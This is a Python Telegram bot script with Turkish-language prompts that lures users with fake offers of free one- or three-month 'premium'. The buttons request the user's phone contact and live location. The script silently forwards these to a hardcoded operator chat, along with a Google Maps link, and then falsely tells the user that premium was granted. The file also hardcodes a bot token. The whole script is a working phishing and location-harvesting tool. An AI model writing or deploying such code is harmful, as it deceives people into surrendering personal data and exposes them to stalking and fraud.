import telebot
from telebot import types
Token='6844122663:AAGGZwB8Xxxlgnpyfav4bZVaUIFp12D5hlM'
bot = telebot.TeleBot(Token)
id = '5407630064'

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    reg_button = types.KeyboardButton(text="1 aylık premium almak için tıkla.", request_contact=True)
    location_button = types.KeyboardButton(text="3 aylık premium almak için tıkla.", request_location=True)
    keyboard.add(reg_button, location_button)
    response = bot.send_message(message.chat.id, "premium almak için lütfen tıklayınız.", reply_markup=keyboard)
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    num = message.contact.phone_number
    bot.send_message(id, text=f"Bastığınız için teşekkür ederiz 1 aylık premium 24 saat içinde hesabınıza gelecektir. : {num} • ¢нαηηєℓ; @deviremesin •")
    bot.send_message(message.chat.id, text="free premium aldınız Tebrikler.")
@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    lat = loc.latitude
    lon = loc.longitude
    bot.send_message(id, text=f'''
Mevcut Konumunuz :
 Enlem={lat}
 Boylam={lon}
 ● [ Google haritası ](https://www.google.com/maps/place/{lat},{lon})''',parse_mode='markdown')
    bot.send_message(message.chat.id, text="3 aylık premium 24 saat içinde hesabınıza gelecektir. • ¢нαηηєℓ; @deviremesin :)")

bot.infinity_polling()
